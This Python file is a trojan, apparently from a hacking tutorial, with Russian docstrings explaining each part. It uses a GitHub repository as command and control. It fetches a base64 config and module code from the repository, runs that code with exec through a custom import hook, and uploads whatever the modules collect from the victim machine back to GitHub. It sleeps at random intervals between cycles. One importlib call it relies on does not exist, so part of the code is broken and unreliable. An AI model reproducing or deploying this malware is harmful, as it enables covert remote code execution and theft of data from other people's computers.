import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime


def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
    user = 'deus99999'
    sess = github3.login(token=token)
    return sess.repository(user, 'bhptrojan')


def get_file_contents(dirname, module_name, repo):
    """Функция get_file_contents принимает название каталога, имя модуля
и соединение с репозиторием, а в ответ возвращает содержимое заданного
модуля . Она отвечает за скачивание файлов из удаленного репозитория
с последующим их чтением локально. С помощью этой функции мы будем
читать как параметры конфигурации, так и исходный код модулей."""
    return repo.file_contents(f'{dirname}/{module_name}').content


class Trojan:
    """В ходе инициализации объекта Trojan  мы передаем ему конфигурационную информацию и путь, по которому троян
    будет записывать свои выходные файлы , а также устанавливаем соединение с репозиторием"""
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_config(self):
        """Метод get_config  извлекает конфигурационный файл из удаленного репозитория, чтобы ваш троян знал, какой
        модуль выполнять. Вызов exec переносит содержимое модуля в объект трояна . Метод module_runner вызывает из
         только что импортированного модуля функцию run  (о том, как
это делается, мы подробнее поговорим в следующем разделе). Метод store_
module_result  создает файл, имя которого содержит текущие дату и время,
и сохраняет в него свой вывод. Троян будет использовать эти три метода для
загрузки любых данных, собранных на атакуемом компьютере, на GitHub."""
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    def run(self):
        """Первым делом нужно взять конфигурационный файл из репозитория. После этого запускаем модуль в отдельном
         потоке. Находясь в методе module_runner, мы вызываем функцию run, принадлежащую модулю, чтобы выполнить его
         код. По окончании работы модуль должен вернуть строку, которую мы затем загрузим в репозиторий."""
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30*60, 3*60*60))


class GitImporter:
    """Класс GitImporter будет использоваться каждый раз, когда интерпретатор пытается загрузить недоступный модуль.
      метод find_module пытается определить местоположение модуля. Мы передаем этот вызов загрузчику удаленных файлов.
      Если файл обнаружен в нашем репозитории, декодируем его из base64 и сохраняем в класс (GitHub возвращает данные в
      формате base64). Возвращая self, мы говорим интерпретатору Python о том, что модуль найден и его можно загрузить
      с помощью метода load_module. Используем стандартную библиотеку importlib, чтобы сначала создать новый пустой
    объект модуля , а затем наполнить его кодом, полученным из GitHub.
    Напоследок свежесозданный модуль нужно вставить в список sys.modules, чтобы он был доступен всем последующим
    вызовам import."""
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.module_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()